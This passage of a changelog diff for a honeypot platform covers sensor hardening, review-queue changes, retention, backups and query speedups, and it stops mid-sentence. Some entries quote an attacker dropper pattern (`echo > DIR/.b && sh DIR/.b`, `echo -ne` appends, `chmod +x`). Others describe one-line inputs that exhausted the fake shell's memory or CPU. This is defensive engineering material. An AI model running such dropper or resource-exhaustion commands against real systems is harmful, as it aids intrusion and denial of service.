+  (it was one per core): the unit is limited to under one core. Storing a body the spool already
+  holds (the same sample re-sent) now re-hashes the file on disk in 64 KiB chunks; it read the
+  whole file into a second buffer, up to 16 MiB outside every memory budget on each repeat.
+- **The fleet page's Ledger panel no longer scans the event table on every refresh** - it ran
+  `count(*)` and `max(ingested_at)` (no index, so a full read) over the whole ledger each 30 s.
+  The count is exact up to 100,000 events and shown bare; past that it is the planner's row
+  estimate, shown as `about N` and labelled `(estimate)`. The newest ingest is read off the
+  newest row by `id`. The Attackers total shares the rule (`routes::rowcount`) and skips its
+  bounded scan once statistics put the table past the cap. The Chain integrity page shares it
+  (see below).
+- **The evidence timeline's header says what it counts** - it read "54 events", which looked like
+  the address's total or its commands. It now reads, for example, `newest 200 events: 199
+  commands, 1 session, 1 outside any session`: ledger rows on the page, of which command
+  events, the distinct sessions, and rows that predate session tracking. "newest" appears only
+  when older events wait behind Load more.
+- **Campaigns and Samples say what the bots are doing and what they dropped** - the Campaigns list
+  was a wall of "same sample" and "same commands" rows, one per host and per command count, and
+  Samples repeated it. The list now sorts by hosts (then last seen; links for last and first
+  seen), hides single-host groups behind a "show single-host groups (N)" toggle, no longer lists
+  the same-sample kind (its page, approval and the queue's group links still work), and gives
+  each row the opening commands, the command range as secondary text, a rule badge, a host count
+  coloured like queue scores, the hosts-per-day sparkline, an Active cell in the queue's format,
+  top sensors and one "delivers" sample link with a count. Tabs are behaviour, multi-service
+  scans, HTTP on shell port and login only. Samples rows gain host count, sparkline, Active and
+  "delivered by campaign N", sorted by hosts. Both lists are cards at 390 px with no sideways
+  scroll. Grouping, indexer, approval and what is submitted are unchanged. The IP page's malware
+  panel no longer says "no samples" beside a captured sample first reported by another address.
+- **The operator allowlist now covers vendor reporting, not only the published feed** - an address
+  in `PROPOLIS_FEED_ALLOWLIST`, `PROPOLIS_FEED_ALLOWLIST_FILE` or an ASN in
+  `PROPOLIS_FEED_ASN_ALLOWLIST` was kept out of the feed but still reached the review queue and
+  could be submitted to AbuseIPDB, DShield and OTX on approval, so a declared crawler could be
+  reported as an attacker. The review queue no longer surfaces a listed address, withdraws one that
+  is already Pending (logged with the reason `allowlisted`; the row is deleted, so removing the
+  address from the list surfaces it again), and the submission runner refuses a listed address
+  before any vendor call even if it was approved before the list covered it. Scoring is unchanged
+  and the console still shows the activity. The list is read once at startup, so an edit needs a
+  restart (a standalone `review` unit needs the variables in its own env file). The parser and the
+  matcher moved from `feed` to `core-scoring::allowlist` so the feed and the review stage share one
+  implementation; malformed-file refusal and the width and size caps are unchanged. The console's
+  queue and IP pages do not yet say "allowlisted".
+- **The review queue reads at a glance** - fifty-six pending rows had become a wall: a notes
+  textarea and three buttons on every row, "honeypot" in every Categories cell, a score bar that
+  hardly varied, and five hosts of one campaign as five full rows. Pending entries now group by
+  campaign: two or more listed members make one expandable row (campaign label, counts, what the
+  group did, the top score and a single "Approve all N", which still goes through the two-step
+  campaign confirmation), and addresses alone in their campaign or in none stay rows. An address
+  in several campaigns is listed under the one with the most pending members, then the most
+  hosts, then the lowest id. The notes field is a "note" toggle inside the row, so decisions post
+  exactly as before. The Categories column is gone from every tab (the data stays on the IP
+  page), the score is a number coloured by feed tier, First seen and Last seen became one Active
+  cell (`10:58-18:11 UTC`, or `2d, last 3 min ago`, exact times on hover) with sort links above
+  the table, and each context line leads with what the address did, dims sensor and session
+  counts, and moves "counts from N of M events" to a tooltip. At 390 px entries stack as cards
+  with no sideways scroll.
+
+### Fixed
+
+- **A full session-memory pool no longer starves every new SSH shell while one session holds far
+  over its share** - a shell or exec was refused whenever the pool had under 512 KiB left, but
+  that refusal never asked an over-share session to let go (only an allocation that fails to
+  reserve does), so with free room between a newcomer's login and 512 KiB, every new shell was
+  refused until `max_duration` ended the holder; about 19 connections from one source at 8 MiB
+  each could do it. A session that stays within its floor (the pool divided by `max_concurrent`)
+  is now given the shell and the session holding the most above its share is asked to let go
+  (`session_memory::AccountRef::make_room`); a session past its own floor is still refused. The
+  shell alone reserves 393,216 bytes in a process's first session and 458,752 in later ones,
+  under the 512 KiB the check asks for by one 64 KiB chunk (measured; a test fails first if that
+  grows). What sessions within their floor RESERVE past a full pool is capped at 13,421,773 bytes
+  (half of what `MemoryMax=512M` has left, `session_memory::configure_with_overdraft`): without
+  the cap that could be the pool again, 167,772,160 bytes with chunk rounding. Past the cap a
+  shell is refused and a running line stopped, the session kept, until the session asked to let
+  go ends: up to 600 s (`max_duration`) when it is blocked writing to a peer that is not
+  reading, since only the write deadline (60 s, restarted by every byte accepted) ends that
+  write. The cap bounds reserved room, not live bytes: a session it refuses keeps what it
+  allocated, and key exchange, login and packet allocations are never stopped by it, so the SSH
+  worst case is not closed. The unreserved residual is up to 167,772,160 bytes and takes the
+  total to 691,221,298, over `MemoryMax` (536,870,912); how to close it is an open owner
+  decision. See
+  [capacity planning](docs/operations/capacity-planning.md#ssh-sensor-worst-case-memory).
+- **One typed line can no longer exhaust a shell sensor's memory or CPU through a command's
+  operand loop** - the fake shell's handlers for `printenv`, `alias`, `type`, `command -V`,
+  `which`, `dpkg -s`, `apt show`, `ls`, `df`, `mv`, `ln`, `touch`, `chmod`, `rm`, `mkdir`,
+  `rmdir`, `kill`, `realpath`, `readlink` and `chattr` answered every operand before the line's
+  work allowance was looked at, and the accounting allocator only counts, so the line ran to
+  completion first. One 8 KB line (`printenv X` four thousand times over a 150 KB value) held
+  1.2 GiB of heap, `realpath -m` over 96,000 operands held 792 MiB, and `dpkg -s` over 132,000
+  names held 1.17 GiB, past the 256 MB and 512 MB units' limits. Each trip now pays a fee, the
+  operand's bytes and its output before the output is built, and a line that cannot pay stops
+  there. The same line shape held a runtime worker through quadratic work that was never
+  charged: a GNU `tr` SET with an opener and no closer (`[:` or `[a*` repeated), the toybox
+  option check on `base64 -ddd...` (362 s for 2 million letters on the adb sensor), and
+  `env NAME=VALUE` with tens of thousands of operands, are now linear; a `stat -c` width
+  (`%4096n`, 4096 bytes per directive per operand), `pgrep -d`/`pidof -S` with a megabyte
+  delimiter, the Android `tr` expanding ranges and classes into tens of megabytes, and `chattr`
+  applying every change to every file are charged before they are built; and the passwd, group,
+  hosts, meminfo and cpuinfo files a command consults, which a session can grow to 64 KiB, are
+  charged by size on each read, so a loop of `getent`, `nslookup`, `free`, `nproc` or `ls -l`
+  stops. Ordinary output is unchanged. See [sensor behavior](docs/reference/sensor-behavior.md).
+- **One scanner can no longer fill the sensor journals** - rustls logged a WARN for what a
+  scanner's malformed TLS hello causes (`Illegal SNI extension: ignoring IP address presented as
+  hostname (<hex>)`, which carries the box's own address whenever the scanner targets it by IP;
+  `Received a ApplicationData message while expecting [Handshake]`; `TLS alert warning received
+  ... CloseNotify`), and the listener logged `handler exceeded max_duration; connection dropped`
+  and `max_concurrent reached` once per connection. With `RUST_LOG` unset, `rustls` and `russh` (whose WARN lines carry client-chosen text) are now held at
+  `error` (`log_format::default_filter`, shared by the sensors, `propolis` and `console`; a set
+  `RUST_LOG` is used as written), the max_duration lines (tcp listener, tftp, dns) are `debug`,
+  and the `max_concurrent` refusals are logged at power-of-two totals. See
+  [environment variables](docs/reference/environment-variables.md#rust_log).
+- **The `env-mode` finding names the two files that are meant to be wider** - its text said every
+  env file but `fleet-listeners.env` carries a secret, and a blanket `chmod 600` over `*.env` took
+  `watch.env` (0640, group `propolis-watch`) away from the live watcher. It now names both
+  exceptions, `watch.env` 0640 and `fleet-listeners.env` 0644, and says not to chmod them 0600.
+  The watcher's own `cannot read /etc/propolis/watch.env: Permission denied` now adds the owner
+  and mode it needs (root:propolis-watch, 0640) and the one-line `chown` and `chmod` that
+  restores them.
+- **A fresh box no longer starts with its env files at 0644** - the operator copies the
+  `.env.example` files into `/etc/propolis`, which leaves `0644`, so every secret-bearing file was
+  world-readable until `config-check.sh` said so. Provisioning (`deploy/env-files.sh`, run by
+  `provision.sh`, so by every install and upgrade) now creates each missing service env file
+  (`propolis.env` and one per sensor) empty, root:root `0600`, so the copy lands in a closed file,
+  and removes group and other access from existing ones. It never writes a value, never loosens a
+  mode or changes an owner, does not follow a symbolic link, and leaves `watch.env` (0640) and
+  `fleet-listeners.env` (0644) to the scripts that write them. Upgrade note: an existing env file
+  that was group- or world-readable is now `0600` after the upgrade; systemd reads
+  `EnvironmentFile=` as root, so the units are unaffected.
+- **SSH clients with no algorithm in common are told so, and the sensor speaks what OpenSSH 8.9
+  offers by default** - the sensor offered one algorithm per KEXINIT slot (curve25519-sha256,
+  ssh-ed25519, chacha20-poly1305, no MACs), parsed the client's KEXINIT and threw it away, so a
+  client that shared nothing with that got KEXINIT and then silence until the idle close. Live,
+  every PuTTY-banner (581 connections, no login) and Go-banner (741, one login) scanner
+  abandoned key exchange, and the cause is not established: older PuTTY releases name the
+  exchange only `curve25519-sha256@libssh.org` (version boundary unverified), which the old
+  offer lacked, and the old offer's empty MAC lists may have failed an older Go x/crypto
+  (unverified; current x/crypto skips MAC negotiation for AEAD ciphers). The `client_kex`
+  lists on the next live run test these. Negotiation now follows RFC 4253 section 7.1 (per list, the
+  first algorithm the client names that the sensor supports), a list with nothing in common is
+  answered with `SSH_MSG_DISCONNECT` (key exchange failed) and a closed connection, and the
+  offer is widened, in OpenSSH 8.9's order, to `curve25519-sha256@libssh.org`,
+  `ecdh-sha2-nistp256`, `diffie-hellman-group14-sha256`, `aes128/192/256-ctr`, `aes128-gcm` and
+  `aes256-gcm`, and `hmac-sha2-256`, `hmac-sha2-512` and `hmac-sha1` with their `-etm` forms. A
+  wrongly guessed `first_kex_packet_follows` packet is dropped instead of being taken for the
+  key exchange, and counted in the client-to-server sequence number. The handshake-end
+  `honeypot_session_end` event now carries the client's offered lists as `client_kex` and, on a
+  refusal, `negotiation_failed` (`kex`, `host_key`, `cipher_c2s`, `cipher_s2c`, `mac_c2s`,
+  `mac_s2c` or `compression`) naming the list, so the operator can see which algorithms a client
+  that never got a session was asking for. No RSA host key is offered (the `rsa` crate carries
+  RUSTSEC-2023-0071), see [sensor behavior](docs/reference/sensor-behavior.md#sensor-ssh).
+  Reading the pre-key-exchange packets still counts them rather than typing them, so an
+  `SSH_MSG_IGNORE` sent there would be read as the exchange's first message (documented, not
+  changed).
+- **Production dependencies: 18 crates join the sensor's graph, approved by the owner on
+  2026-10-15** - the new ciphers and key exchanges link `aes`, `aes-gcm`, `ctr` and `p256` into
+  `sensor-ssh`, which until now only its test client reached, and with them `aead`,
+  `base16ct`, `cpubits`, `crypto-bigint`, `der`, `elliptic-curve`, `ff`, `ghash`, `group`,
+  `polyval`, `primefield`, `primeorder`, `sec1` and `wnaf`. All 18 are vendored, none has a
+  `build.rs`, and `cargo deny check` is clean for `bans`, `licenses` and `sources` with no
+  advisory against any of them (`advisories` fails on `rustls` 0.23.45, locked at that version
+  before this change). Versions and the chain that pulls each in are in
+  [dependencies](docs/reference/dependencies.md).
+- **`diffie-hellman-group14-sha256` is throttled** - a client picks it before authenticating and
+  it costs the sensor 3.50-3.73 ms of CPU per connection (the modular exponentiations are about
+  2.7 ms of that) against 0.90-1.15 ms for curve25519, with the concurrency caps bounding
+  simultaneous connections rather than their rate. The owner decided on 2026-10-15 to keep
+  offering it in OpenSSH 8.9's order and cap it: the exponentiation moves off the async workers,
+  one process-wide permit is held for twice an exchange's cost (half a core, about 140 exchanges
+  a second, inside the unit's `CPUQuota=75%`), and a client that negotiates group14 while the
+  permit is taken waits at most 2 s, then gets `SSH_MSG_DISCONNECT` (too many connections) and
+  a handshake-end event with `kex_refused` `group14_busy`. curve25519 and ecdh clients never
+  wait on it. See the cost note in
+  [sensor behavior](docs/reference/sensor-behavior.md#sensor-ssh).
+- **A vendor, VirusTotal or gateway that stops answering no longer stalls its caller forever** -
+  the abuse-vendor adapters shared a `reqwest::Client::new()` with no timeout, so one vendor
+  that accepted the connection and never replied held the submission loop on that request with no
+  error; VirusTotal had only a total deadline and fell back to a deadline-free client if its
+  builder failed; and the shipper's gateway dial and ack wait had none, so a silent gateway
+  stopped shipping for every log. They now have connect, read and total deadlines (vendors
+  10/30/60 s, VirusTotal 10/30/30 s, shipper 20 s dial and 60 s per batch; the read deadline is
+  the wait for response headers, then a per-read timer on the body) that end as a
+  retryable error. A vendor 2xx whose body never finished was also recorded as an accepted
+  submission with an empty body; it is now retried. The ntfy poster, the heartbeat pinger and the
+  fetcher already had deadlines. See [integrations](docs/reference/integrations.md#vendor-abuse-submitters).
+- **An unreadable probe no longer sends a false "recovered"** - an ops-alert condition whose
+  source could not be read for one tick counted as healthy, so an open incident got a
+  `[recovered]` notice and then re-paged as a new one. An unreadable probe now holds the
+  condition where it was; a probe unreadable for 30 minutes already warned, and that warning now
+  says when an earlier page is still open. See
+  [unreadable probes](docs/operations/health-and-observability.md#unreadable-probes-and-undeliverable-alerts).
+- **An alert the push channel rejected is no longer lost** - a delivery that failed past the
+  dispatcher's retry (about two seconds when the failure is fast, about two minutes against a host
+  that accepts and never answers) was logged once and forgotten, and the next page was a full
+  re-page cooldown away. It is now queued, retried at 30 s doubling to 15 minutes, and logged at
+  WARN on each failed retry; the queue is persisted to `ops-alert-undelivered.json` in the cursor
+  directory and a restart reports what was never delivered (journal WARN and one summary alert).
+  The retry pass runs after the heartbeat, stops at its first failure and is capped at 20 s per
+  tick, so it can delay the next round by at most that long and never suppresses the dead-man's
+  heartbeat. A new page raised during an outage is still sent inline, before the heartbeat, and
+  against a host that never answers can take about two minutes per alert; see the operations page.
+- **The echo-loader tracker no longer loses the ELF typed after a directory probe sweep** - the
+  common loader first tries 24 directories with `echo > DIR/.b && sh DIR/.b && cd DIR/`; each
+  write filled one of the 16 slots a shell tracks and none could ever be captured (a one-chunk
+  file is a probe, not an upload), so the ELF typed next (120 `echo -ne` appends, `chmod +x`, a
+  run) was never tracked and live sessions captured nothing. A bare `echo > f` (a lone newline) is
+  now a dead one-chunk record: a script dropper built from it by appends continues it, a bare
+  `echo > f` over a tracked file replaces that file's record (in the session's list too, so a
+  rebuilt dropper is captured), and a full table drops its oldest file that would not be taken at
+  the session's end (fewer than two chunks, and not an ELF) rather than refusing the new one; the
+  session's end-of-session list does the same. A one-line ELF (a first chunk holding a full
+  16-byte `e_ident`) is exempt from that eviction, and so is now also captured when the session
+  ends without ever running it, where before it was skipped as a one-chunk probe; the bare
+  four-byte magic typed as text is not an ELF. The 16-slot bound stays: a record is a path, a
+  digest and one terminal line (about 70 KiB for a full table), and the file bytes are charged to
+  the filesystem budget. See [events and signals](docs/reference/events-and-signals.md).
+- **The MSSQL sensor records the Login7 UserName, not the AppName** - the username was read from
+  the AppName offset pair (bytes 48..52) instead of UserName (40..44, MS-TDS 2.2.6.4), so every
+  captured username was a driver name such as `Core Microsoft SqlClient Data Provider`. The
+  password stays unread.
+- **A full sensor spool no longer erases the uploads it refuses** - once a sensor's spool was
+  full (100 MB) or a body was over its per-file cap, the hand-off logged a line and built no
+  event, so the source, topic, size and hash of every later upload were lost from the ledger.
+  The upload event is now always emitted, for every body-capturing sensor: without a `sample`
+  (nothing is on disk to name), with `stored: false` and a `not_stored_reason` (`spool_full`,
+  `file_too_large`, `spool_entry_invalid`, `spool_error`), and with `sha256`, `size` and
+  `orig_name` of the body that was seen. The Samples list, the IP malware panel and the campaign
+  indexer (which keys on `sample_sha256`) do not show or link such a row; the IP timeline and the
+  review queue show it as `name (hash..., size, not stored: spool full)`. The refusal
+  WARN is now logged at power-of-two totals, as the queue-drop WARN is. See
+  [queue and spool](docs/operations/queue-and-spool.md#spool-refusals-spool_refused_count).
+- **Sample retention now works on the shipped units: each sensor ages out its own spool** - the
+  daemon's retention pass walked every sensor spool but could not delete from any: its unit
+  (`ProtectSystem=strict`) lists only `fetched` in `ReadWritePaths`, and the spool directories
+  are `0750` for the sensor, so the daemon's group membership gives it read and no write. The pass
+  logged nothing, so spools filled to their 100 MB budget and stayed full. Each spooling sensor
+  (ssh, telnet, adb, ftp, tftp, mqtt) now removes samples older than 30 days from its own spool at
+  start and hourly, as the account that owns the directory, and recounts its budget; this needs no
+  unit or directory change and gives the daemon no new write access. The daemon's pass now walks
+  only the spool it owns (`fetched`) and logs a WARN when it finds a sample it cannot remove, as
+  the sensors do. A collector in a split deployment, which runs no daemon, is now trimmed too; that
+  deletes the only copy of each body there after 30 days, which the planned custody design allows
+  only on `CustodyComplete`; the owner accepted age-only pruning on collectors on 2026-10-20 until
+  that receipt lands (see [retention](docs/operations/retention.md)). Retention frees space by age
+  only, so a spool that fills in days stays full until its oldest bodies turn 30 days.
+  `retention_deploy` checks the units and `provision.sh` for every spool a pass walks. See
+  [retention](docs/operations/retention.md).
+- **A sensor whose spool filled up now captures again once files are removed** - the spool's
+  byte count was recovered from the directory at startup and then only ever grew, so removing
+  files from a running sensor's spool (sample retention, an operator) freed nothing and every
+  capture was refused until the sensor restarted. A store that would be refused now re-reads the
+  directory first (at most once a second) and counts the files actually present plus the stores
+  in progress, under the same lock as the reservation. See
+  [queue and spool](docs/operations/queue-and-spool.md#spool-storage-properties).
+- **The submission pass reads its cooldowns in one query** - every pass looked up each approved
+  address and vendor on its own (`SELECT submitted_at FROM vendor_submission ... LIMIT 1`, about
+  17,000 a pass on the live node for 5,600 addresses and three vendors), and read each address's
+  protocol labels before any vendor's gate had passed, so a pass in which nearly every pair is held
+  by cooldown (the steady state) still ran thousands of single-row queries, each timed by sqlx as
+  a stall (backlog J10). The pass now reads the latest successful submission of every
+  (address, vendor) pair in one query (`CooldownBook`) and the protocol labels only for an
+  address whose gate passed. Decisions are unchanged: a differential test checks all 120 pairs of
+  a seeded history against the per-pair query, and a pair the book does not cover, or a book that
+  fails to load, falls back to the per-pair query. The vendor-wide rate-limit count still runs
+  only for pairs that pass the cooldown. No setting, no behaviour change.
+- **Steps that held an async worker for tens of milliseconds now run off it** - the daemon runs
+  every subsystem on one tokio runtime, and sqlx times a statement from issue to poll, so a task
+  stuck in synchronous code shows up as 1-2 s `COMMIT`s and primary-key lookups with the database
+  idle (backlog J10). Measured with the new `cpu_budget` example (release build), the steps over
+  10 ms were: digest of a 16 MiB fetched body 142 ms and its spool write 242 ms (outliers 950 ms
+  with the fsync); a feed publish 167 ms for 5,000 entries and 905 ms for 50,000; the chain hash
+  of an 8 MiB intake batch 77 ms, run with the ledger's append lock held; the tailer's read of one
+  8 MiB batch 13 ms from a warm cache; the ops-monitor's walk of a 20,000-file spool 85 ms on
+  every tick; the feed builder's row loops, 3 ms for 5,000 addresses but 31 ms for 50,000; and the
+  campaign indexer's analysis of a command line, 0.4 ms at the sensors' 1 KiB
+  cap but 16 ms at 64 KiB and 60 ms at 1 MiB. Each now runs through the new
+  `core_scoring::off_worker`, which hands the rest of the worker's queue to another thread while
+  the step runs (a command line over 16 KiB; every other step always). The ATT&CK tagger, indicator
+  extraction at its cap, dropper URL extraction, batch JSON parsing and the upload filter measured
+  under 10 ms and are unchanged. No setting, no behaviour change.
+- **Redacting secrets from attacker text is linear** - `ioc::redact_secrets` replaced each
+  credential inside one growing string and lowercased the whole string again for every
+  `authorization:` it found, and scanned to the end of the text from every marker in
+  `authorization:authorization:...`. A megabyte of the first shape took 8.2 s in a release build,
+  256 KiB 12 s in a debug test run; the campaign indexer, the ATT&CK tags and the indicator
+  extraction all call it. It is now two single passes that copy what they keep, held byte for
+  byte to the old implementation over 30,000 generated texts. No behaviour change.
+- **A writer waiting for the append lock no longer holds a pooled connection** - every ledger
+  writer took its connection first and the Postgres advisory lock second, so with as many intake
+  tailers (one per sensor log) as the pool has connections (10 by default) every waiting tailer was a connection doing nothing, and the
+  console, the review loops and the campaign indexer queued for one (`acquired_after_secs`
+  3.256 on the live node). Writers in a process now queue on a fair in-process gate, one per
+  database, before they ask the pool for anything, so only the writer at the head of the queue
+  sits on the advisory lock; the lock itself is unchanged and still orders writers across
+  processes and nodes. The console's delist, relist and delete queue on the same gate
+  (`begin_exclusive` now returns `core_scoring::ExclusiveTx`, which derefs to the connection and
+  has the same `commit`). No setting, no migration. See
+  [storage](docs/architecture/storage.md#serialized-single-writer-append).
+- **Nightly backups no longer fill the volume that log rotation needs** - the free-space check
+  asked only whether the next set fits, and retention pruned only after a good write, so with the
+  defaults (7 scheduled and 3 pre-upgrade sets of about 1 GB each) a 17 GB `/var` holding a 6.6 GB
+  database fell under the ops monitor's 15% low-disk threshold and then to 0.8% free; log rotation
+  refused every log and the node spiralled. `backup.sh` now prunes the run's own reason down to
+  one fewer than its limit (never below one, never the other reason) before it estimates, and
+  refuses before dumping unless the volume would still keep the larger of the monitor's threshold
+  (`PROPOLIS_OPS_CAPACITY_FREE_PCT`, read from `propolis.env`, default 15) and the logrotate
+  guard's 512 MiB reserve, naming the shortfall and the fixes (`PROPOLIS_BACKUP_KEEP`,
+  `PROPOLIS_BACKUP_DIR`). `config-check.sh` gains a `backup-headroom` warning when the worst
+  night's sets (`KEEP - 1` scheduled, 3 pre-upgrade, the next one a fifth larger) cannot fit
+  beside what else the volume holds within that headroom, with the numbers; run without root it
+  cannot read the 0750 backup directory, so it lists the headroom under LIMITED CHECKS instead
+  of guessing (run it with `sudo` for the verdict). A node already near the line will
+  see backups refuse until you lower `PROPOLIS_BACKUP_KEEP` or move the backup directory. On
+  the incident's numbers (17 GiB `/var`, 6.6 GiB database, 1.07 GiB sets) steady backups need
+  `PROPOLIS_BACKUP_KEEP=3` or a separate backup volume. **An upgrade can now be blocked by this
+  rule**: `upgrade.sh` runs `backup.sh --reason pre-upgrade` before it installs anything, and a
+  refusal stops the upgrade with the box untouched. The refusal names the ways out: free space on
+  the volume, run a scheduled backup with a lower `PROPOLIS_BACKUP_KEEP` to prune, move
+  `PROPOLIS_BACKUP_DIR`, or `PROPOLIS_UPGRADE_SKIP_BACKUP=1` for that upgrade (no database to roll
+  back to). At `PROPOLIS_BACKUP_KEEP=1` a refusal says retention cannot shrink further, and a
+  `PROPOLIS_BACKUP_KEEP` written with leading zeros (`08`, `010`) is read as decimal.
+  `PROPOLIS_OPS_CAPACITY_FREE_PCT` is read the way systemd and the daemon read it for the forms
+  the tests cover (whitespace around the key, `=` and value, a leading `+` or zeros, matching
+  quotes, the last assignment winning); backslash escapes, line continuations and trailing
+  comments after a quoted value are not modelled, and a value the daemon refuses sizes against the
+  default 15. See
+  [backup and restore](docs/operations/backup-and-restore.md) and
+  [upgrade, rollback and DR](docs/operations/upgrade-rollback-and-dr.md).
+- **The dashboard and the fleet pane count their time windows from an hourly roll-up, not from the
+  ledger** - the hourly chart, the sensor split, the 7- and 30-day charts and the fleet pane's
+  24-hour listener counts each grouped every event in their window on every load and every 30 s
+  poll of every open tab (160 ms, 161 ms, 1.2 s and 314 ms on 1,500,000 events, growing with the
+  ledger). New core-scoring migration `0025` adds `event_hour_listener` (events and newest event
+  per UTC hour by sensor, protocol and port) and a cursor, filled from the ledger by the
+  migration; the console folds the events appended since its last read into it before it reads. The pages now cost the
+  number of hours in the window (10 ms, 10 ms, 13 ms and 11 ms). Every number is the one the
+  ledger gives: the partial hour at the start of a window, and any event the roll-up has not
+  folded yet, are counted from the ledger itself, so a count is exact whether or not the roll-up
+  is current. A roll-up nobody refreshes costs more as it falls behind, but is bounded: the page
+  tells the planner how far behind the roll-up is, so it reads the window by time rather than
+  walking every event past the cursor. That bound is about four times the old single-column
+  count, not the old cost itself: with the cursor set back 7 days on the 1.5M-event seed the
+  sensor split took 279 ms against 73 ms for the previous `GROUP BY sensor` (each row now also
+  goes through the hour function and a JSON extraction, and groups by four keys), and 8.7 ms
+  with the cursor current. The pages refresh it on every load; three failures in a row are named
+  in the dashboard's and the fleet pane's degraded banner and counted by the
+  `propolis_console_rollup_refresh_failures` metric. In a time zone whose offset is not a whole
+  number of hours at any point in the last 45 days (India, Nepal, Lord Howe) the hourly and daily
+  charts read the ledger as before. The roll-up is derived and disposable: it can be emptied and
+  refills from the ledger. See [database](docs/reference/database.md#event-rollups).
+- **The dashboard's most-active panel is served from the last answer, at most 15 minutes old, and
+  refreshed behind the request** - it groups every event of the last 24 hours by source address
+  (330 ms on 274,000 events, 1.5 s on the live node), which no index or roll-up answers exactly (a
+  roll-up by source address was built, measured at 275 ms against 535 ms, and removed). A page
+  load answers from the last panel computed, and the panel can lag by up to a quarter hour. A
+  background task started with the console recomputes it at every quarter-hour boundary, ten
+  minutes after the previous attempt if none has run since (the age cap equals the quarter hour, so
+  an idle console would otherwise pass the cap in the 1.5 s before the replacement landed and make
+  that view wait), and once at start; a load that finds it more than 30 seconds old starts one
+  more recomputation behind the request (the dashboard's second load on 1.6M events: 440 ms to 120
+  ms). Age is counted from when the computation started, so the data shown is at most 15 minutes
+  old. A held panel older than that, or more than one quarter hour behind, is never shown: that
+  load waits for a fresh computation, and if that fails the dashboard's degraded banner says so.
+  So the first view is fast except on a cold start, before the first computation lands, and after
+  the process was stopped (SIGSTOP, a frozen container) for longer than the cap or refreshes
+  failed for that long. The cost is two aggregates per quarter hour, about 0.33% of one
+  database backend on the live node (3 s in 900 s). A wall clock stepped back by more than a
+  quarter hour no longer pins the held panel: the next computation replaces it. Across an hour
+  boundary the old panel's hourly strip is one cell off until the refresh. The panel's "last seen"
+  is worded when it is served, so it ages; the held answer is per process and is never shared or
+  stored. A failed scheduled refresh keeps the previous answer (until the age cap), is logged, and
+  is retried at the next trigger.
+- **An address page no longer reads every ATT&CK tag to show one address's** - the technique
+  read named no session condition, so neither of `attack_tag`'s two partial unique indexes (each
+  partial on whether a session is recorded) could serve it, and it read the whole table on every
+  page: 45 ms for 300,000 tags, and the table has no retention. New core-scoring migration `0024`
+  adds `attack_tag_source_idx (source_ip)` (0.5 ms). See
+  [database](docs/reference/database.md#attack-tag-tables).
+- **`/metrics` reads the scored addresses once, not four times** - the four address gauges
+  (`propolis_ips_scored`, `_eligible`, `_recommended_vendor`, `_recommended_blocklist`) were four
+  `count(*)` statements, each reading every `ip_score` row on every scrape; one statement with
+  filtered counts now gives all four (about 200 ms to 119 ms on 500,000 addresses). The values are
+  unchanged.
+- **The Chain integrity page no longer counts the ledger on every load** - it ran `count(*)`
+  over the event table (113 ms on 1,500,000 events, growing with the ledger). It now shows what
+  the fleet pane's ledger panel shows: the exact count up to 100,000 events, and past that the
+  planner's estimate, labelled "About N events in the ledger (estimate)". Running the
+  verification still states the exact number of events it verified, since it has just read them
+  all.
+- **The Samples page, the address page's malware panel and the fleet capture panel stop reading
+  the ledger to find uploads** - the Samples page read the source addresses of every sample ever
+  captured (250 ms on 1,500,000 events) and tested every event for a truncated capture (150 ms) to
+  use the 200 digests it lists; an address page found its samples by reading all of that
+  address's events (226 ms for one with 187,000); the fleet pane's capture rate and dominant end
+  reason walked 7 days of the ledger twice per 30 s poll to find the 1-2% that are uploads (240
+  ms and 250 ms). New core-scoring migration `0023` adds two partial indexes that hold only those
+  events (504 kB and 2 MB per 1,500,000 events): `event_upload_observed_idx` and
+  `event_sample_sha_idx`. The Samples page now asks only about the digests it shows. The
+  statements repeat the indexes' predicates, which is what lets the planner use them (12 ms, 5
+  ms, 20 ms, and 37 ms plus 27 ms). The index is built inside the migration transaction, so
+  writes to `event` wait for the build at the first start on the new version (see `0013`). See
+  [database](docs/reference/database.md).
+- **The feed build no longer reads every approved address's whole history** - each candidate's
+  `categories` were `SELECT DISTINCT signal_type FROM event WHERE source_ip = ...`, which reads
+  every event the address ever produced: 4.3 s for 5,566 approved addresses on the live node, on
+  every build, and it ran even for addresses too old for any feed to carry. The statement now
+  probes the 17 members of `signal_type_enum` through `event_dedup_idx`, one descent each, so its
+  cost is the number of types and not the number of events (an address with 1,042 events on
+  average: 236 ms to 74 ms per 200 addresses, and the gap grows with the history), and the build
+  skips the candidates whose last event is older than the longest feed window, which
+  `materialize` would discard anyway; with no retention window configured it no longer reads the
+  volume-listed floods at all, since only a window publishes one. The published files are
+  unchanged.
+- **The search menus and the fleet pane no longer read the whole ledger** - the search form's
+  sensor menu was `SELECT DISTINCT sensor FROM event` (2.4 s on the live node) and its signal-type
+  menu `SELECT DISTINCT signal_type FROM event` (3.1 s), run on every load of either search page;
+  the fleet pane, polled every 30 s by every open tab, grouped every event from 30 days ago to
+  24 hours ago just to find each listener's newest one (552 ms on 1,500,000 events, and on a
+  ledger that old most of it). New core-scoring migration `0022` adds `event_listener_idx
+  (sensor, protocol, port, observed_at)`; the sensor menu and the fleet read step through it from
+  one listener to the next, so they cost the number of listeners (236 ms to 1.4 ms, and 552 ms to
+  3.4 ms). The index is built inside the migration transaction, so writes to `event` wait for
+  the build at the first start on the new version (see `0013` for the cost on a large ledger:
+  about 6 s per 1,500,000 events), and each appended event writes one more index entry (about 6
+  us). The signal-type menu is covered by the next entry. See
+  [database](docs/reference/database.md).
+- **The search page's signal-type menu and filter no longer read the ledger** - the menu was
+  `SELECT DISTINCT signal_type FROM event` (3.1 s on the live node) and the filter compared
+  `signal_type::text`, which no index serves, so choosing a type with few or no events walked the
+  whole ledger by time (1.1 to 2.9 s for a type with none on 1,500,000 events). New core-scoring
+  migration `0026` adds `event_signal_observed_idx (signal_type, observed_at)`; the menu steps
+  through it from one type to the next and lists the types the ledger holds, as it always did
+  (1.1 ms), and the filter compares the enum column itself (11 ms for a type with no events,
+  page included). A name that is not a signal type finds nothing, as before. Each appended event
+  writes one more index entry (about 6 us). The append path as a whole, with `0021`, `0022`,
+  `0023` and `0026`, was measured end to end against a ledger without them (batches of 200, 20,000
+  events, 1.5M-event ledger, six alternating runs on a shared host): 420 us against 470 us per
+  event at best (about +10%), single appends 3.8 against 4.0 ms; the added time is inside the
+  append lock. See [database](docs/reference/database.md).
+- **The dashboard's top attacker and the Attackers table no longer score every address** - the
+  hero's top attacker computed the decayed score of every `ip_score` row to keep one (1.1 s on the
+  live node, 3.5 s on a 500,000-address test table), and the Attackers table's default sort scored
